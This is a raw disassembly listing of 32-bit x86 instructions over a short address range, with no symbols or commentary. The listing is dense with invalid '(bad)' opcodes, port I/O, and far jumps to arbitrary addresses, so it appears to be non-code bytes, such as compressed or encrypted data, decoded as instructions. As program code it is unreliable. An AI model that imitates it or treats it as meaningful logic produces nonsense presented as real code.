  427e11:	mov    esi,0xa9032054
  427e16:	xchg   edx,eax
  427e17:	loope  0x427e66
  427e19:	imul   eax,DWORD PTR [edi-0x763b13f0],0xfffffff5
  427e20:	mov    BYTE PTR [esi],dl
  427e22:	imul   DWORD PTR [eax-0x7e]
  427e25:	pushf  
  427e26:	dec    esp
  427e27:	hlt    
  427e28:	scas   al,BYTE PTR es:[edi]
  427e29:	stos   DWORD PTR es:[edi],eax
  427e2a:	test   DWORD PTR [eax-0x5a52d058],edx
  427e30:	mov    ebx,0xec8f5dfb
  427e35:	or     eax,ebx
  427e37:	xchg   edx,eax
  427e38:	sub    bl,bh
  427e3a:	popf   
  427e3b:	dec    esi
  427e3c:	cmp    edx,ecx
  427e3e:	pop    ecx
  427e3f:	aaa    
  427e40:	outs   dx,DWORD PTR ds:[esi]
	...
  427eb1:	add    BYTE PTR [eax],al
  427eb3:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  427eba:	mov    dh,0xf7
  427ebc:	mov    ebx,esi
  427ebe:	cmp    ebx,edx
  427ec0:	(bad)  
  427ec1:	pop    es
  427ec2:	pop    ebx
  427ec3:	cwde   
  427ec4:	shl    DWORD PTR [edi+0xf50001],cl
  427eca:	add    BYTE PTR [eax],al
  427ecc:	pop    ebx
  427ecd:	js     0x427edf
  427ecf:	ficom  DWORD PTR [ebx-0xb]
  427ed2:	fwait
  427ed3:	push   edx
  427ed4:	fcom   DWORD PTR [esi-0x6b]
  427ed7:	push   esp
  427ed8:	sti    
  427ed9:	lea    edi,[edx-0x20]
  427edc:	jns    0x427ebf
  427ede:	dec    edx
  427edf:	lods   al,BYTE PTR ds:[esi]
  427ee0:	(bad)  
  427ee1:	cmp    BYTE PTR [ebp+0x12],0xcb
  427ee5:	jmp    0x12f8:0x82f531f3
  427eec:	mov    ecx,0xb1bbb4d3
  427ef1:	retf   
  427ef2:	xlat   BYTE PTR ds:[ebx]
  427ef3:	mov    al,ds:0x54d99220
  427ef8:	arpl   WORD PTR [eax-0x50],si
  427efb:	dec    edi
  427efc:	ds inc ebp
  427efe:	call   0x2298:0x320c2071
  427f05:	mov    ebp,0xf669eee
  427f0a:	repz or DWORD PTR [eax+ecx*8-0x39],eax
  427f0f:	pop    esp
  427f10:	loopne 0x427f7e
  427f12:	pusha  
  427f13:	ja     0x427f5b
  427f15:	je     0x427f1e
  427f17:	neg    BYTE PTR [ecx]
  427f19:	add    bl,BYTE PTR [ecx-0x70]
  427f1c:	es hlt 
  427f1e:	cwde   
  427f1f:	lods   al,BYTE PTR ds:[esi]
  427f20:	in     eax,0x76
  427f22:	ss aam 0x67
  427f25:	pop    edx
  427f26:	loop   0x427f84
  427f28:	mov    DWORD PTR [ebp-0x11],edi
  427f2b:	shr    BYTE PTR [ebp-0x4a7d3d73],1
  427f31:	retf   
  427f32:	sub    BYTE PTR [esi+0x22d4d70],bh
  427f38:	xchg   bh,ch
  427f3a:	mov    cl,BYTE PTR [ecx]
  427f3c:	lock xchg esi,eax
  427f3e:	push   ebp
  427f3f:	int    0x80
  427f41:	sub    dl,cl
  427f43:	mov    ecx,0xc33e39fd
  427f48:	sbb    DWORD PTR [esi-0x80],eax
  427f4b:	pop    ecx
  427f4c:	retf   0xd127
  427f4f:	out    dx,eax
  427f50:	adc    al,0x5d
  427f52:	stos   DWORD PTR es:[edi],eax
  427f53:	cmp    ebp,DWORD PTR [eax-0x3e5e9c6c]
  427f59:	test   DWORD PTR [ebx],ecx
  427f5b:	in     al,dx
  427f5c:	and    edx,DWORD PTR [edx]
  427f5e:	sub    DWORD PTR [edi],esp
  427f60:	push   esp
  427f61:	and    DWORD PTR [eax],ecx
  427f63:	jns    0x427ef6
  427f65:	mov    eax,0x37c35f38
  427f6a:	ins    DWORD PTR es:[edi],dx
  427f6b:	into   
  427f6c:	fmul   st,st(0)
  427f6e:	sbb    BYTE PTR [ebp-0x5c52619a],bh
  427f74:	xor    BYTE PTR [edx-0x652f6c8b],ah
  427f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f7b:	pop    edi
  427f7d:	mov    edx,0xf22cc7ab
  427f82:	jbe    0x427fd7
  427f84:	push   ebx
  427f85:	call   0x3893:0x7e4d8393
  427f8c:	into   
  427f8d:	dec    esp
  427f8e:	or     al,0x66
  427f90:	and    eax,0xc2d3750b
  427f95:	cld    
  427f96:	call   0xb284:0x4f7e785b
  427f9d:	repz add eax,0xc100d498
  427fa3:	adc    BYTE PTR [edx-0x268d39be],dh
  427fa9:	in     eax,0xc5
  427fab:	loopne 0x427f89
  427fad:	push   edi
  427fae:	aaa    
  427faf:	cmp    ebp,DWORD PTR [ecx+0x6a6fa985]
  427fb5:	mov    ebp,0x852d7b8e
  427fba:	inc    BYTE PTR [eax+0x61f624d]
  427fc0:	inc    ecx
	...
  428031:	add    BYTE PTR [eax],al
  428033:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42803a:	(bad)  
  42803b:	std    
  42803c:	mov    DWORD PTR [ebx+0x5a],edx
  42803f:	xchg   DWORD PTR [ebp-0x5a],ecx
  428042:	cld    
  428043:	add    al,cl
  428045:	test   al,0x1
  428047:	add    ch,dh
  428049:	add    BYTE PTR [eax],al
  42804b:	add    BYTE PTR [esi-0x1401ba5],dh
  428051:	sbb    eax,DWORD PTR cs:[edi]
  428054:	ret    0x30ca
  428057:	inc    edi
  428058:	fs push ebp
  42805a:	sahf   
  42805b:	sub    DWORD PTR [ebp+0x21dafaa1],edx
  428061:	mul    DWORD PTR [esi+0x7094122f]
  428067:	xchg   edi,eax
  428068:	mov    ch,0x16
  42806a:	add    ebx,esi
  42806c:	add    ebp,esi
  42806e:	std    
  42806f:	cmp    BYTE PTR [ebp-0x52],dl
  428072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428073:	jnp    0x42809a
  428075:	loop   0x4280b5
  428077:	pop    edi
  428078:	pop    ss
  428079:	dec    edi
  42807a:	or     edx,esi
  42807c:	ficom  DWORD PTR [ecx]
  42807e:	add    al,0x73
  428080:	(bad)  
  428081:	cli    
  428082:	jbe    0x4280a0
  428084:	xor    bh,BYTE PTR [ecx]
  428086:	push   0xffffff9d
  428088:	xchg   ecx,eax
  428089:	and    ah,0xe3
  42808c:	adc    edi,DWORD PTR [ecx+0x67]
  42808f:	sbb    BYTE PTR [ecx+0x57],0x2
  428093:	push   ss
  428094:	loope  0x4280ff
  428096:	add    edx,esp
  428098:	jb     0x4280e8
  42809a:	imul   BYTE PTR [ebx]
  42809c:	dec    ebx
  42809d:	jne    0x42809f
  42809f:	loop   0x428063
  4280a1:	bound  esi,QWORD PTR [esi+0x51aa9d3e]
  4280a7:	xor    ebx,ebx
  4280a9:	pushf  
  4280aa:	loope  0x428120
  4280ac:	dec    edx
  4280ad:	in     eax,0xf3
  4280af:	mov    eax,eax
  4280b1:	mov    dh,0xde
  4280b3:	out    0xc7,al
  4280b5:	jbe    0x4280f4
  4280b7:	sub    esp,eax
  4280b9:	xchg   ebx,eax
  4280ba:	out    dx,al
  4280bb:	leave  
  4280bc:	(bad)
  4280bf:	jno    0x428121
  4280c1:	pop    ds
  4280c2:	out    0xc8,eax
  4280c4:	jo     0x4280cd
  4280c6:	fcom   QWORD PTR ds:0xd1505911
  4280cc:	and    al,0x9
  4280ce:	cmp    ah,dh
  4280d0:	mul    eax
  4280d2:	adc    cl,cl
  4280d4:	bound  ecx,QWORD PTR [edi-0x71a032b8]
  4280da:	out    dx,eax
  4280db:	mov    bl,0xe0
  4280dd:	pop    edi
  4280de:	call   0x43309e67
  4280e3:	aaa    
  4280e4:	xchg   ebp,eax
  4280e5:	clc    
  4280e6:	in     eax,0xfc
  4280e8:	xchg   edi,eax
  4280e9:	stos   BYTE PTR es:[edi],al
  4280ea:	cwde   
  4280eb:	jo     0x428085
  4280ed:	inc    edi
  4280ee:	gs mov edx,0xd8d1e5b
  4280f4:	push   edi
  4280f5:	shr    DWORD PTR [ebp-0x51],1
  4280f8:	in     eax,0xdc
  4280fa:	dec    edi
  4280fb:	mov    dl,0xda
  4280fd:	dec    ebx
  4280fe:	xchg   edx,eax
  4280ff:	xchg   edx,esp
  428101:	xchg   ecx,eax
  428102:	lds    edx,FWORD PTR [ebp-0x6812aa5f]
  428108:	sub    ebx,edi
  42810a:	arpl   WORD PTR [edi+esi*4],dx
  42810d:	bound  ebp,QWORD PTR [ebx-0x66]
  428110:	jne    0x428182
  428112:	sahf   
  428113:	jle    0x4280ea
  428115:	lock es jle 0x42814b
  428119:	pop    ebx
  42811a:	push   ecx
  42811b:	or     al,0x94
  42811d:	inc    edi
  42811e:	scas   eax,DWORD PTR es:[edi]
  42811f:	pop    edx
  428120:	(bad)  
  428121:	xlat   BYTE PTR ds:[ebx]
  428122:	mov    BYTE PTR [ecx+0x762f8cd1],al
  428128:	cmp    eax,0xaba46cf2
  42812d:	out    0xee,eax
  42812f:	cli    
  428130:	clc    
  428131:	and    al,0x16
  428133:	jmp    0xaf2c:0x1a7c3343
  42813a:	xchg   edi,eax
  42813b:	cmp    DWORD PTR [esi],edx
  42813d:	into   
  42813e:	loop   0x4280e2
  428140:	and    BYTE PTR [eax],al
	...
  4281b2:	add    BYTE PTR [eax],al
  4281b4:	push   ds
  4281b5:	inc    ecx
  4281b6:	fdiv   QWORD PTR [edi+ebx*8+0x79eb7ebd]
  4281bd:	stos   BYTE PTR es:[edi],al
  4281be:	push   0xc4122a4f
  4281c3:	mov    bh,BYTE PTR [ebp-0xafffe57]
  4281c9:	add    BYTE PTR [eax],al
  4281cb:	add    BYTE PTR [esi-0x2f],dl
  4281ce:	inc    eax
  4281cf:	jb     0x42816c
  4281d1:	pop    ds
  4281d2:	rol    ecx,1
  4281d4:	icebp  
  4281d5:	loope  0x4281d4
  4281d7:	aaa    
  4281d8:	out    dx,eax
  4281d9:	and    BYTE PTR [ecx-0x3c],0xe6
  4281dd:	ins    DWORD PTR es:[edi],dx
  4281de:	in     al,0x85
  4281e0:	mov    ebp,0xca9e5854
  4281e5:	je     0x428191
  4281e7:	push   ecx
  4281e8:	cmp    ah,ch
  4281ea:	mov    ah,0xb
  4281ec:	sbb    edi,DWORD PTR [edx]
  4281ee:	enter  0x664a,0xa5
  4281f2:	jecxz  0x428266
  4281f4:	lods   eax,DWORD PTR ds:[esi]
  4281f5:	dec    esi
  4281f6:	inc    esi
  4281f7:	call   0x5806:0x4d89e298
  4281fe:	bswap  ebp
  428200:	imul   esi,DWORD PTR [ebx-0x68],0xffffffbd
  428204:	jne    0x428257
  428206:	push   ebx
  428207:	dec    edx
  428208:	mov    esi,0x88e9e869
  42820d:	pop    ss
  42820e:	lock in eax,0xe5
  428211:	pop    ebp
  428212:	ins    BYTE PTR es:[edi],dx
  428213:	lahf   
  428214:	jg     0x428202
  428216:	push   edx
  428217:	cmp    ch,BYTE PTR [edx+0x4d]
  42821a:	xchg   edx,eax
  42821b:	push   cs
  42821c:	fst    DWORD PTR [ebx]
  42821e:	add    BYTE PTR [edi+0x50],0x31
  428222:	dec    ebx
  428223:	xchg   DWORD PTR [ecx],esi
  428225:	dec    edi
  428226:	int3   
  428227:	out    0xdc,al
  428229:	sub    cl,BYTE PTR [edi]
  42822b:	push   esi
  42822c:	ds jl  0x428217
  42822f:	add    dh,BYTE PTR [eax-0x67]
  428232:	pushf  
  428233:	(bad)  
  428234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428235:	retf   0x9db5
  428238:	push   edi
  428239:	pop    esp
  42823a:	daa    
  42823b:	addr16 add edx,eax
  42823e:	das    
  42823f:	ret    
  428240:	out    dx,al
  428241:	inc    esp
  428242:	or     eax,0xc369ebed
  428247:	inc    ebp
  428248:	sahf   
  428249:	call   0xe5008eb8
  42824e:	or     al,0x3a
  428250:	add    BYTE PTR [eax-0x36],0xea
  428254:	ja     0x428225
  428256:	fisub  WORD PTR [edx+eiz*2+0x4e]
  42825a:	out    0xd1,al
  42825c:	xchg   edi,eax
  42825d:	and    bl,BYTE PTR [edi]
  42825f:	sub    edi,DWORD PTR [esi+ecx*2-0xe3b8664]
  428266:	inc    ebp
  428267:	push   esp
  428268:	mov    bl,0x1
  42826a:	jp     0x428298
  42826c:	inc    ecx
  42826d:	xor    DWORD PTR [eax],eax
  42826f:	jmp    0x2cdaf689
  428274:	mov    ch,0x5b
  428276:	xchg   ebx,eax
  428277:	add    ecx,DWORD PTR [ebx]
  428279:	dec    edi
  42827a:	sub    DWORD PTR [ebx+ecx*1+0x37],0xc790814d
  428282:	scas   al,BYTE PTR es:[edi]
  428283:	mov    al,ds:0xc93855f1
  428288:	jmp    0x6a98:0x29c2db69
  42828f:	in     eax,0x69
  428291:	cmp    DWORD PTR [ecx+0x2f25d312],ebp
  428297:	cmp    al,0xb0
  428299:	gs aaa 
  42829b:	(bad)  
  42829c:	sbb    DWORD PTR [ebx+0x3b],ebp
  42829f:	inc    ebx
  4282a0:	mov    dh,0xec
  4282a2:	cdq    
  4282a3:	jmp    0x4282d3
  4282a5:	pop    ecx
  4282a6:	jl     0x4282fc
  4282a8:	cwde   
  4282a9:	mov    ch,0x24
  4282ab:	and    esp,ebp
  4282ad:	inc    eax
  4282ae:	push   edi
  4282af:	repz sub esp,DWORD PTR [ebp+0x38]
  4282b3:	push   esi
  4282b4:	leave  
  4282b5:	aad    0xb1
  4282b7:	push   0xd7a4a8b9
  4282bc:	or     esp,DWORD PTR ds:0x5e2cb3
	...
  428332:	add    BYTE PTR [eax],al
  428334:	adc    bl,BYTE PTR ds:0xaf3f8832
  42833a:	mov    edx,0x671fe09f
  42833f:	pusha  
  428340:	retf   
  428341:	imul   esp,DWORD PTR [ecx],0xffffffa9
  428344:	mov    dl,0xaa
  428346:	add    DWORD PTR [eax],eax
  428348:	cmc    
  428349:	add    BYTE PTR [eax],al
  42834b:	add    cl,bh
  42834d:	(bad)  
  42834f:	out    dx,al
  428350:	(bad)  
  428351:	jge    0x42839e
  428353:	sbb    BYTE PTR [ebp-0x70b5796],ch
  428359:	sbb    eax,0xea91d3c0
  42835e:	add    dh,bh
  428360:	neg    BYTE PTR [edx]
  428362:	(bad)  
  428363:	mov    bh,0xbb
  428365:	rcr    DWORD PTR [eax-0x1a9d0609],0x33
  42836c:	stc    
  42836d:	neg    DWORD PTR [ecx]
  42836f:	push   esp
  428370:	(bad)  
  428371:	loopne 0x428328
  428373:	jmp    0x755b:0xf646c65b
  42837a:	mov    esi,?
  42837c:	cmp    bh,BYTE PTR ds:0x63c61dae
  428382:	sbb    bl,bh
  428384:	add    esi,DWORD PTR [eax-0x6d]
  428387:	inc    edx
  428388:	push   ecx
  428389:	ret    0x7402
  42838c:	and    ebp,DWORD PTR [esi+eax*1]
  42838f:	mov    esi,0x87669e4a
  428394:	pusha  
  428395:	int3   
  428396:	mov    DWORD PTR [edx*2+0x7ddaf704],edi
  42839d:	(bad)  
  42839e:	push   ecx
  42839f:	hlt    
  4283a0:	sti    
  4283a1:	lods   al,BYTE PTR ds:[esi]
  4283a2:	xchg   esi,eax
  4283a3:	or     BYTE PTR [edx+ecx*4+0x1351feb],al
  4283aa:	int    0x74
  4283ac:	ss fsubr st,st(5)
  4283af:	(bad)  
  4283b0:	out    dx,al
  4283b1:	adc    BYTE PTR [esi],dl
  4283b3:	add    dl,BYTE PTR [eax-0x2a903cea]
  4283b9:	mov    esp,0xbbdc9fd8
  4283be:	and    eax,0xa7512a98
  4283c3:	jmp    0x783b:0x82e8cd44
  4283ca:	inc    eax
  4283cb:	push   edx
  4283cc:	pop    ecx
  4283cd:	fidivr DWORD PTR [ebx-0x61f1ea89]
  4283d3:	jne    0x4283b7
  4283d5:	fdiv   QWORD PTR [ebp-0x7e]
  4283d8:	and    al,ch
  4283da:	add    ebp,esp
  4283dc:	or     DWORD PTR [ebx],esi
  4283de:	push   edi
  4283df:	inc    ecx
  4283e0:	push   esi
  4283e1:	push   es
  4283e2:	mov    eax,ds:0xa5ab86de
  4283e7:	xchg   esi,eax
  4283e8:	xchg   ch,cl
  4283ea:	mov    dl,0xf1
  4283ec:	mov    bh,0x3b
  4283ee:	add    BYTE PTR [ecx+0x57fccc3],ah
  4283f4:	shl    BYTE PTR [ecx],1
  4283f6:	or     bl,al
  4283f8:	jnp    0x4283ff
  4283fa:	jae    0x42844e
  4283fc:	int3   
  4283fd:	sub    edx,esi
  4283ff:	test   eax,0x4adbe059
  428404:	mov    ch,0xcd
  428406:	jge    0x428396
  428408:	call   0x822cc3d
  42840d:	aam    0x76
  42840f:	pop    esp
  428410:	push   ss
  428411:	(bad)  
  428412:	not    ebx
  428414:	inc    ebp
  428415:	in     eax,dx
  428416:	mov    al,0x8f
  428418:	pop    ecx
  428419:	xchg   esp,eax
  42841a:	adc    BYTE PTR [ecx],ah
  42841c:	cld    
  42841d:	in     eax,0x17
  42841f:	mov    edi,0x7b6ef82f
  428424:	xlat   BYTE PTR ds:[ebx]
  428425:	add    ebx,DWORD PTR [ebp+0x5572d2d5]
  42842b:	repnz ss push cs
  42842e:	mov    ebx,0xaa94b3ff
  428433:	(bad)  
  428434:	mov    eax,ds:0xa825354e
  428439:	mov    bl,0x2
  42843b:	dec    esp
  42843c:	pop    ss
  42843d:	lea    edx,[esi]
  42843f:	pop    es
  428440:	test   DWORD PTR [eax],eax
	...
  4284b2:	add    BYTE PTR [eax],al
  4284b4:	pop    esp
  4284b5:	test   al,0xc0
  4284b7:	stos   DWORD PTR es:[edi],eax
  4284b8:	hlt    
  4284b9:	jmp    0x42853a
  4284bb:	jmp    FWORD PTR [ecx-0x3494cbf9]
  4284c1:	push   esp
  4284c2:	aas    
  4284c3:	(bad)  
  4284c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284c5:	stos   DWORD PTR es:[edi],eax
  4284c6:	add    DWORD PTR [eax],eax
  4284c8:	cmc    
  4284c9:	add    BYTE PTR [eax],al
  4284cb:	add    BYTE PTR [esp+edx*4],al
  4284ce:	fdivp  st(5),st
  4284d0:	mov    ebp,0xc8084ca3
  4284d5:	out    dx,al
  4284d6:	aaa    
  4284d7:	xor    edx,edx
  4284d9:	ja     0x428524
  4284db:	pushf  
  4284dc:	addr16 jle 0x4284f9
  4284df:	ds aaa 
  4284e1:	(bad)  
  4284e2:	adc    bl,dh
  4284e4:	fwait
  4284e5:	jge    0x428534
  4284e7:	xchg   esi,eax
  4284e8:	test   BYTE PTR [edi-0x22cac3a],dl
  4284ee:	mul    DWORD PTR [ebx+0x35c6dc5d]
  4284f4:	fs cs mov al,0x7e
  4284f8:	mov    ds:0x733ce230,al
  4284fd:	ficomp DWORD PTR [ebp-0x23]
  428500:	gs (bad) 
  428502:	int    0x6
  428504:	push   0x5860dca
  428509:	jl     0x428503
  42850b:	retf   
  42850c:	pop    ebp
  42850d:	frstor fs:[eax+0x35]
  428511:	out    dx,al
  428512:	fbld   TBYTE PTR [edx-0x28]
  428515:	jns    0x42850a
  428517:	add    eax,0x6e1cb8e2
  42851c:	sub    eax,0xd9aeea9b
  428521:	cs in  eax,dx
  428523:	sbb    al,BYTE PTR ds:0x75e9cda1
  428529:	adc    BYTE PTR [edx+0x75d9d883],0x4d
  428530:	mov    dl,0x78
  428533:	dec    ebx
  428534:	xlat   BYTE PTR ds:[ebx]
  428535:	mov    edx,0x5f7549f4
  42853a:	out    0xca,eax
  42853c:	add    BYTE PTR [ecx],bl
  42853e:	sub    DWORD PTR [esi-0x31dddbf8],ebx
  428544:	mov    ss,esi
  428546:	sub    al,0xd6
  428548:	fsub   st,st(4)
  42854a:	xchg   ebp,eax
  42854b:	xchg   edx,eax
  42854c:	push   esp
  42854d:	stos   BYTE PTR es:[edi],al
  42854e:	call   0x4242:0x72204123
  428555:	mov    es,WORD PTR [esi-0x6d8d4cc6]
  42855b:	loope  0x428529
  42855d:	rcl    edx,cl
  42855f:	scas   al,BYTE PTR es:[edi]
  428560:	pop    ds
  428561:	in     al,0x33
  428563:	xchg   ebp,eax
  428564:	add    bl,bh
  428566:	mov    dl,0x87
  428568:	mov    edi,DWORD PTR [edx]
  42856a:	clc    
  42856b:	fs sub al,0xa5
  42856e:	in     eax,dx
  42856f:	js     0x428545
  428571:	repz or DWORD PTR [ebx-0x2f7483d8],ebx
  428578:	loopne 0x428560
  42857a:	inc    ebp
  42857b:	mov    ebp,DWORD PTR [eax+0x2a]
  42857e:	xor    al,0x76
  428580:	jmp    0x428535
  428582:	ficomp DWORD PTR [ebp-0x2b]
  428585:	ret    0xe42
  428588:	std    
  428589:	call   0x3ea6:0xd6bfafe
  428590:	ins    DWORD PTR es:[edi],dx
  428591:	nop
  428592:	push   ss
  428593:	inc    esi
  428594:	cmp    al,0x90
  428596:	mov    ebx,edx
  428598:	mov    eax,ds:0x3579e989
  42859d:	mov    cl,0x1e
  42859f:	repz inc esi
  4285a1:	jno    0x4285b7
  4285a3:	mov    dl,0x1b
  4285a5:	push   es
  4285a6:	jmp    0x2b2e:0x7fbfcb82
  4285ad:	cmp    al,0xed
  4285af:	sahf   
  4285b0:	mov    ds:0xa2875710,al
  4285b5:	call   0xdd5bba68
  4285ba:	(bad)  
  4285bb:	out    0xaf,al
  4285bd:	imul   edi,ebp,0x63
  4285c0:	out    dx,eax
	...
  428631:	add    BYTE PTR [eax],al
  428633:	add    BYTE PTR [ecx],al
  428635:	push   esi
  428636:	nop
  428637:	out    dx,al
  428638:	xlat   BYTE PTR ds:[ebx]
  428639:	out    dx,al
  42863a:	jg     0x42863b
  42863c:	(bad)  
  42863d:	dec    esi
  42863e:	cmp    al,0xb7
  428640:	or     BYTE PTR es:[edi+edi*2-0x64],ah
  428645:	lods   al,BYTE PTR ds:[esi]
  428646:	add    DWORD PTR [eax],eax
  428648:	cmc    
  428649:	add    BYTE PTR [eax],al
  42864b:	add    BYTE PTR ds:0xe57f6fea,bh
  428651:	pop    ds
  428652:	pop    es
  428653:	cld    
  428654:	popa   
  428655:	jecxz  0x4286d5
  428657:	fldcw  WORD PTR [eax+ebx*1]
  42865a:	push   edi
  42865b:	sti    
  42865c:	xlat   BYTE PTR ds:[ebx]
  42865d:	xchg   ebp,eax
  42865e:	ja     0x4286d2
  428660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428661:	cwde   
  428662:	push   edi
  428663:	sbb    edx,ebx
  428665:	cmc    
  428666:	in     eax,dx
  428667:	adc    DWORD PTR [esi],ecx
  428669:	mov    eax,ds:0xfad077de
  42866e:	mov    edi,0xdf870026
  428673:	outs   dx,DWORD PTR ds:[esi]
  428674:	mov    ds:0xe7cce16d,al
  428679:	push   ss
  42867a:	inc    eax
  42867b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42867c:	pusha  
  42867d:	add    eax,0xede7e077
  428682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428683:	mov    esi,0x1c71bbff
  428688:	adc    ebp,edx
  42868a:	push   ebp
  42868b:	xchg   BYTE PTR [esp+eiz*8+0x44],ch
  42868f:	scas   al,BYTE PTR es:[edi]
  428690:	mov    ss,WORD PTR [edx]
  428692:	sbb    DWORD PTR [ecx],0x90c718ad
  428698:	mov    dl,BYTE PTR gs:[eax]
  42869b:	shr    esi,0x82
  42869e:	and    cl,cl
  4286a0:	pop    ebx
  4286a1:	inc    ebp
  4286a2:	push   eax
  4286a3:	aad    0x72
  4286a5:	call   0x852a:0x4bbe993f
  4286ac:	leave  
  4286ad:	jb     0x42865c
  4286af:	push   eax
  4286b0:	shr    ah,1
  4286b2:	cwde   
  4286b3:	pop    es
  4286b4:	mov    ecx,0x25366cfc
  4286b9:	test   BYTE PTR [ebx],bh
  4286bb:	jecxz  0x428649
  4286bd:	or     al,0x4a
  4286bf:	mov    edx,0xa81106f9
  4286c4:	jmp    0x428658
  4286c6:	leave  
  4286c7:	fs lahf 
  4286c9:	shl    BYTE PTR [edi+0x7e1b01b6],1
  4286cf:	ins    BYTE PTR es:[edi],dx
  4286d0:	not    BYTE PTR [edi+0x2034c893]
  4286d6:	dec    esi
  4286d7:	jns    0x4286ea
  4286d9:	repz jg 0x428719
  4286dc:	sub    BYTE PTR [edx+ebx*4+0x658235a3],cl
  4286e3:	pusha  
  4286e4:	bound  esi,QWORD PTR [ebx]
  4286e6:	xchg   esi,eax
  4286e7:	nop
  4286e8:	sbb    ch,BYTE PTR [edi+0x5c]
  4286eb:	jmp    0x90bf:0xe3f01721
  4286f2:	imul   ebp,ecx,0xffffff98
  4286f5:	clc    
  4286f6:	lods   eax,DWORD PTR ds:[esi]
  4286f7:	jbe    0x4286a9
  4286f9:	test   BYTE PTR [ebp-0x6a621c49],0x41
  428700:	ins    BYTE PTR es:[edi],dx
  428701:	in     eax,dx
  428702:	les    ebx,FWORD PTR [esi]
  428704:	xor    DWORD PTR [ebp-0x7b],ebp
  428707:	es and eax,0x597c6999
  42870d:	jg     0x4286ea
  42870f:	pop    ecx
  428710:	mov    dh,0x7b
  428712:	retf   0x1aef
  428715:	xchg   DWORD PTR [ecx-0x3f],edx
  428718:	mov    esp,0x82248407
  42871d:	(bad)  
  42871e:	and    al,0xd4
  428720:	repnz dec ecx
  428722:	or     bl,bh
  428724:	das    
  428725:	adc    eax,0x217b45e0
  42872b:	and    DWORD PTR [ecx+0x40830a0a],0x20
  428732:	lock mov al,0xe1
  428735:	mov    esp,0x7ea12919
  42873a:	loopne 0x42875f
  42873c:	loope  0x4286fb
  42873e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42873f:	(bad)  
  428740:	test   al,0x0
	...
  4287b2:	add    BYTE PTR [eax],al
  4287b4:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4287ba:	pop    esi
  4287bb:	fbstp  TBYTE PTR [ebx]
  4287bd:	mov    edx,0xd843299e
  4287c2:	inc    edx
  4287c3:	mov    edx,0x1ad91
  4287c8:	cmc    
  4287c9:	add    BYTE PTR [eax],al
  4287cb:	add    BYTE PTR [ebx-0x5a],ch
  4287ce:	mov    BYTE PTR [edx-0x18],cl
  4287d1:	cs ja  0x428853
  4287d4:	mov    DWORD PTR [eax+0x55],ecx
  4287d7:	adc    DWORD PTR [ecx+0x48216d42],ebx
  4287dd:	loope  0x42880d
  4287df:	dec    ebx
  4287e0:	out    dx,eax
  4287e1:	pop    ebp
  4287e2:	mov    ah,0xeb
  4287e4:	jnp    0x42884f
  4287e6:	iret   
  4287e7:	cmp    al,0xc0
  4287e9:	jge    0x4287e9
  4287eb:	xor    ch,al
  4287ed:	daa    
  4287ee:	and    BYTE PTR [esi-0x4],dh
  4287f1:	sbb    BYTE PTR [eax-0x60bba9a6],0xb0
  4287f8:	js     0x42885e
  4287fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4287fb:	jp     0x428816
  4287fd:	call   0x90d2:0x14db6208
  428804:	les    esp,FWORD PTR [eax+0x1d]
  428807:	pop    esp
  428808:	rcr    BYTE PTR [esi+0xa8cda0c],1
  42880e:	jae    0x428827
  428810:	pop    esi
  428811:	repnz stc 
  428813:	lock test BYTE PTR [edx+0x6cc801a1],dl
  42881a:	xor    ch,bh
  42881c:	sbb    eax,DWORD PTR [eax+0x5]
  42881f:	call   0xda1a8a57
  428824:	and    eax,ebx
  428826:	jge    0x42882a
  428828:	dec    esp
  428829:	or     DWORD PTR [edi+edx*2],0xc
  42882d:	xchg   edx,eax
  42882e:	dec    ecx
  42882f:	fmul   DWORD PTR [ebx]
  428831:	xchg   ecx,ecx
  428833:	(bad)  
  428834:	jnp    0x4287bd
  428836:	push   ecx
  428837:	enter  0x1e3d,0xe8
  42883b:	mov    ebp,0x78095529
  428840:	mov    ecx,0x2de307ab
  428845:	mov    edx,0x898e5da2
  42884a:	out    0xeb,al
  42884c:	mov    edi,0x1b55425d
  428851:	and    BYTE PTR [esi],ch
  428853:	popf   
  428854:	pop    ebp
  428855:	(bad)  
  428856:	cs jg  0x428845
  428859:	pop    ebp
  42885a:	adc    esi,edi
  42885c:	mov    edx,0xd1d23178
  428861:	jle    0x42882b
  428863:	xchg   edx,eax
  428864:	xchg   ebx,eax
  428865:	and    DWORD PTR [eax+0x229ea2c3],esi
  42886b:	ja     0x428824
  42886d:	mov    ecx,0xe87345ff
  428872:	repnz sahf 
  428874:	and    ch,0x8b
  428877:	aad    0xb6
  428879:	adc    BYTE PTR [eax+0x17e115b0],ah
  42887f:	xchg   ebp,eax
  428880:	scas   eax,DWORD PTR es:[edi]
  428881:	mov    esp,0xabda390b
  428886:	test   BYTE PTR ds:0x69fa0fc8,al
  42888c:	test   cl,ah
  42888e:	push   esp
  42888f:	push   ebx
  428890:	mov    al,ds:0x8ae7184c
  428895:	out    0x1b,eax
  428897:	add    BYTE PTR [ebp+0x6fe17318],cl
  42889d:	mov    cl,0xee
  42889f:	cld    
  4288a0:	or     edi,esp
  4288a2:	loopne 0x4288b4
  4288a4:	sti    
  4288a5:	xchg   ebp,eax
  4288a6:	(bad)  
  4288a7:	jnp    0x428860
  4288a9:	inc    edx
  4288aa:	mov    edi,0xa02a710f
  4288af:	push   esp
  4288b0:	jnp    0x4288f9
  4288b2:	mov    esp,0xd0dd5387
  4288b7:	call   0x464e:0xf7166e40
  4288be:	mov    cl,0x69
  4288c0:	fwait
	...
  428931:	add    BYTE PTR [eax],al
  428933:	add    BYTE PTR [edx-0x5c0023],bl
  428939:	mov    ds:0x79f8fdde,eax
  42893e:	ja     0x42892a
  428940:	xchg   esi,eax
  428941:	stos   DWORD PTR es:[edi],eax
  428942:	mov    esp,0x1ae86bd
  428947:	add    ch,dh
  428949:	add    BYTE PTR [eax],al
  42894b:	add    BYTE PTR [edx-0x141c9954],dh
  428951:	aas    
  428952:	test   BYTE PTR [ebx],0x24
  428955:	mov    ah,0xc1
  428957:	jmp    0x428966
